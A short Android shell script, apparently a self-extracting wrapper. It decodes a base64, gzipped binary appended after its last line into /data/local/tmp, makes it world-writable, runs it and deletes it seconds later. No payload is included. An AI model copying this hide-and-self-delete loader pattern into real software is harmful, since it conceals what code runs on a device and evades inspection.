TMP_DIR="/data/local/tmp/yshell"
BINARY="${TMP_DIR}/$(mktemp -u XXXXXXX)"
sed "1,/^# This is the last line of the script/d" "$0" | base64 -d | gzip -d > "${BINARY}"
if [ $? -ne 0 ]; then    
    echo "Log: 解压缩文件失败！"
    exit 1
fi
chmod 777 "${BINARY}"
if [ $? -ne 0 ]; then    
    echo "Log: 执行权限设置失败！"
    rm -f "${BINARY}"
    exit 1
fi
nohup sh -c "sleep 2; rm -rf \"$BINARY\"" &>/dev/null &
"${BINARY}"
if [ $? -ne 0 ]; then    
    echo "Log: 执行代码失败！"
    rm -f "${BINARY}"
    exit 1
fi
sleep 0.5
exit 0
# This is the last line of the script
